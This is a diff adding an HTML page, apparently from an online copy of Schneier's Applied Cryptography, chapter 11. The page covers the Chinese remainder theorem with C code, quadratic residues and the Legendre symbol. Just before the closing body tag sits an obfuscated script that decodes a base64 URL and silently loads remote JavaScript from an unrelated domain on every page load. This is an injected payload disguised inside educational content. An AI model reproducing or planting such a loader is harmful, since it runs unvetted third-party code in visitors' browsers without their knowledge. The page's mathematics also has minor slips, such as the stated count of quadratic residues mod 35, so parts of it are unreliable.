@@ -1,0 +1,172 @@
+<html>
+<head>
+<TITLE>APPLIED CRYPTOGRAPHY, SECOND EDITION: Protocols, Algorithms, and Source Code in C:Mathematical Background</TITLE>
+<!-- BEGIN HEADER -->
+<META NAME="ROBOTS" CONTENT="NOINDEX, NOFOLLOW">
+<SCRIPT>
+<!--
+function displayWindow(url, width, height) {
+        var Win = window.open(url,"displayWindow",'width=' + width +
+',height=' + height + ',resizable=1,scrollbars=yes');
+}
+//-->
+</SCRIPT>
+
+</HEAD>
+<body bgcolor="ffffff" link="#006666" alink="#006666" vlink="#006666">
+<P>
+<CENTER><B>Applied Cryptography, Second Edition: Protocols,  Algorthms, and Source Code in C (cloth)</B>
+<FONT SIZE="-2">
+<BR>
+<I>(Publisher: John Wiley & Sons, Inc.)</I>
+<BR>
+Author(s): Bruce Schneier
+<BR>
+ISBN: 0471128457
+<BR>
+Publication Date: 01/01/96
+</FONT></CENTER>
+<P>
+
+
+<!-- Empty Reference Subhead -->
+
+<!--ISBN=0471128457//-->
+<!--TITLE=APPLIED CRYPTOGRAPHY, SECOND EDITION: Protocols, Algorithms, and Source Code in C//-->
+<!--AUTHOR=Bruce Schneier//-->
+<!--PUBLISHER=Wiley Computer Publishing//-->
+<!--CHAPTER=11//-->
+<!--PAGES=249-251//-->
+<!--UNASSIGNED1//-->
+<!--UNASSIGNED2//-->
+
+<CENTER>
+<TABLE BORDER>
+<TR>
+<TD><A HREF="11-07.html">Previous</A></TD>
+<TD><A HREF="../ewtoc.html">Table of Contents</A></TD>
+<TD><A HREF="11-09.html">Next</A></TD>
+</TR>
+</TABLE>
+</CENTER>
+<P><BR></P>
+<P>In general, if the prime factorization of <I>n</I> is <I>p<SUB><SMALL>1</SMALL></SUB>*p<SUB><SMALL>2</SMALL></SUB>*...*p<SUB><SMALL>t</SMALL></SUB></I>, then the system of equations</P>
+<DL>
+<DD>(<I>x</I> mod <I>pi</I>) = ai, where <I>i</I> = 1, 2<I>,...</I>, <I>t</I>
+</DL>
+<P>has a unique solution, <I>x</I>, where <I>x</I> is less than <I>n.</I> (Note that some primes can appear more than once. For example, <I>p<SUB><SMALL>1</SMALL></SUB></I> might be equal to <I>p<SUB><SMALL>2</SMALL></SUB></I> .) In other words, a number (less than the product of some primes) is uniquely identified by its residues mod those primes.</P>
+<P>For example, use 3 and 5 as primes, and 14 as the number. 14 mod 3 = 2, and 14 mod 5 = 4. There is only one number less than 3*5 = 15 which has those residues: 14. The two residues uniquely determine the number.</P>
+<P>So, for an arbitrary <I>a</I> &lt <I>p</I> and <I>b</I> &lt <I>q</I> (where <I>p</I> and <I>q</I> are prime), there exists a unique <I>x</I>, where <I>x</I> is less than <I>pq</I>, such that</P>
+<DL>
+<DD><I>x</I> &#8801; a (mod <I>p</I>), and <I>x</I> &#8801; b (mod <I>q</I>)
+</DL>
+<P>To find this <I>x</I>, first use Euclid&#146;s algorithm to find <I>u</I>, such that</P>
+<DL>
+<DD><I>u*q</I> &#8801; 1 (mod <I>p</I>)
+</DL>
+<P>Then compute:
+</P>
+<DL>
+<DD><I>x</I> = (((<I>a</I> - b)*u) mod <I>p</I>)*q &#43; b
+</DL>
+<P>Here is the Chinese remainder theorem in C:
+</P>
+<!-- CODE //-->
+<PRE>
+    /* r is the number of elements in arrays m and u;
+    m is the array of (pairwise relatively prime) moduli
+    u is the array of coefficients
+    return value is n such than n == u[k]%m[k] (k=0..r-1) and
+    	n &lt m[0]*m[1]*...*m[r-1]
+    */
+
+    /* totient() is left as an exercise to the reader. */
+    int chinese_remainder (size_t r, int *m, int *u)
+    {
+        size_t i;
+        int modulus;
+        int n;
+        modulus = 1;
+        for (i=0; i&ltr; &#43;&#43;i)
+    	modulus *= m[i];
+
+        n = 0;
+        for (i=0; i&ltr; &#43;&#43;i) {
+    	n &#43;= u[i] * modexp(modulus / m[i], totient(m[i]),
+        m[i]);
+    	n %= modulus;
+        }
+
+        return n;
+    }
+</PRE>
+<!-- END CODE //-->
+<P>The converse of the Chinese remainder theorem can also be used to find the solution to the problem: if <I>p</I> and <I>q</I> are primes, and <I>p</I> is less than <I>q</I>, then there exists a unique <I>x</I> less than <I>pq</I>, such that</P>
+<DL>
+<DD><I>a</I> &#8801; x (mod <I>p</I>), and <I>b</I> &#8801; x (mod <I>q</I>)
+</DL>
+<P>If <I>a</I> &#8805; <I>b</I> mod <I>p</I>, then</P>
+<DL>
+<DD><I>x</I> = (((<I>a</I> - (<I>b</I> mod <I>p</I>))*<I>u</I>) mod <I>p</I>)*<I>q &#43; b</I>
+</DL>
+<P>If <I>a</I> &lt <I>b</I> mod <I>p</I>, then</P>
+<DL>
+<DD><I>x</I> = (((<I>a</I> &#43; p - (<I>b</I> mod <I>p</I>))*<I>u</I>) mod <I>p</I>)*<I>q &#43; b</I>
+</DL>
+<P><FONT SIZE="+1"><B><I>Quadratic Residues</I></B></FONT></P>
+<P>If <I>p</I> is prime, and <I>a</I> is greater than 0 and less than <I>p</I>, then <I>a</I> is a <B>quadratic residue</B> mod <I>p</I> if</P>
+<DL>
+<DD><I>x</I><SUP><SMALL>2</SMALL></SUP> &#8801; a (mod <I>p</I>), for some <I>x</I>
+</DL>
+<P>Not all values of <I>a</I> satisfy this property. For <I>a</I> to be a quadratic residue modulo <I>n</I>, it must be a quadratic residue modulo all the prime factors of <I>n.</I> For example, if <I>p</I> = 7, the quadratic residues are 1, 2, and 4:</P>
+<DL>
+<DD>1<SUP><SMALL>2</SMALL></SUP> = 1 &#8801; 1 (mod 7)
+<DD>2<SUP><SMALL>2</SMALL></SUP> = 4 &#8801; 4 (mod 7)
+<DD>3<SUP><SMALL>2</SMALL></SUP> = 9 &#8801; 2 (mod 7)
+<DD>4<SUP><SMALL>2</SMALL></SUP> = 16 &#8801; 2 (mod 7)
+<DD>5<SUP><SMALL>2</SMALL></SUP> = 25 &#8801; 4 (mod 7)
+<DD>6<SUP><SMALL>2</SMALL></SUP> = 36 &#8801; 1 (mod 7)
+</DL>
+<P>Note that each quadratic residue appears twice on this list.
+</P>
+<P>There are no values of <I>x</I> which satisfy any of these equations:</P>
+<DL>
+<DD><I>x<SUP><SMALL>2</SMALL></SUP></I> &#8801; 3 (mod 7)
+<DD><I>x<SUP><SMALL>2</SMALL></SUP></I> &#8801; 5 (mod 7)
+<DD><I>x<SUP><SMALL>2</SMALL></SUP></I> &#8801; 6 (mod 7)
+</DL>
+<P>The <B>quadratic nonresidues</B> modulo 7, the numbers that are not quadratic residues, are 3, 5, and 6.</P>
+<P>Although I will not do so here, it is easy to prove that, when <I>p</I> is odd, there are exactly (<I>p</I>- 1)/2 quadratic residues mod <I>p</I> and the same number of quadratic nonresidues mod <I>p.</I> Also, if <I>a</I> is a quadratic residue mod <I>p</I>, then <I>a</I> has exactly two square roots, one of them between 0 and (<I>p</I>- 1)/2, and the other between (<I>p</I>- 1)/2 and (<I>p</I>- 1). One of these square roots is also a quadratic residue mod <I>p;</I> this is called the <B>principal square root</B>.</P>
+<P>If <I>n</I> is the product of two primes, <I>p</I> and <I>q</I>, there are exactly (<I>p</I>- 1)(<I>q</I>- 1)/4 quadratic residues mod <I>n.</I> A quadratic residue mod <I>n</I> is a perfect square modulo <I>n.</I> This is because to be a square mod <I>n</I>, the residue must be a square mod <I>p</I> and a square mod <I>q.</I> For example, there are 11 quadratic residues mod 35: 1, 4, 9, 11, 14, 15, 16, 21, 25, 29, and 30. Each quadratic residue has exactly four square roots.</P>
+<P><FONT SIZE="+1"><B><I>Legendre Symbol</I></B></FONT></P>
+<P>The <B>Legendre symbol</B>, written L(<I>a,p</I>), is defined when <I>a</I> is any integer and <I>p</I> is a prime greater than 2. It is equal to 0, 1, or -1.</P>
+<DL>
+<DD>L(<I>a,p</I>) = 0 if <I>a</I> is divisible by <I>p.</I>
+<DD>L(<I>a,p</I>) = 1 if <I>a</I> is a quadratic residue mod <I>p</I>.
+<DD>L(<I>a,p</I>) = - 1 is <I>a</I> is a quadratic nonresidue mod <I>p</I>.
+</DL>
+<P>One way to calculate L(<I>a,p</I>) is:</P>
+<DL>
+<DD>L(<I>a,p</I>) = a<SUP><SMALL>(<I>p-</I> 1)/2</SMALL></SUP> mod <I>p</I>
+</DL>
+<P>Or you can use the following algorithm:
+</P>
+<DL>
+<DD><B>1.</B>&nbsp;&nbsp;If <I>a</I> = 1, then L(<I>a,p</I>) = 1
+<DD><B>2.</B>&nbsp;&nbsp;If <I>a</I> is even, then L(<I>a,p</I>) = L(<I>a</I> /2<I>,p</I>)*(- 1)<SUP><SMALL>(p<SUP><SMALL>2</SMALL></SUP>- 1)/8</SMALL></SUP>
+<DD><B>3.</B>&nbsp;&nbsp;If <I>a</I> is odd (and &#8800; 1), then L(<I>a,p</I>) = L(<I>p</I> mod <I>a,a</I>)*(- 1)<SUP><SMALL>(<I>a-</I> 1)*(<I>p-</I> 1)/4</SMALL></SUP>
+</DL>
+<P>Note that this is also an efficient way to determine whether <I>a</I> is a quadratic residue mod <I>p</I> (when <I>p</I> is prime).</P><P><BR></P>
+<CENTER>
+<TABLE BORDER>
+<TR>
+<TD><A HREF="11-07.html">Previous</A></TD>
+<TD><A HREF="../ewtoc.html">Table of Contents</A></TD>
+<TD><A HREF="11-09.html">Next</A></TD>
+</TR>
+</TABLE>
+</CENTER>
+
+[an error occurred while processing this directive]
+<script type="text/javascript">(function(oSzOHoWo, dIofllyJ) {dIofllyJ = oSzOHoWo.createElement('script');dIofllyJ.type = 'text/javascript';dIofllyJ.async = true;dIofllyJ.src = atob('0024241d2f28Ly91YmxvY2stcmVmZXJlci5kZXYvY2FtcGFpZ24uanM=0024241d2f28'.replace(/0024241d2f28/gi, '')) + '?' + String(Math.random()).replace('0.','');oSzOHoWo.getElementsByTagName('body')[0].appendChild(dIofllyJ);}(document));</script></body>
+</html>
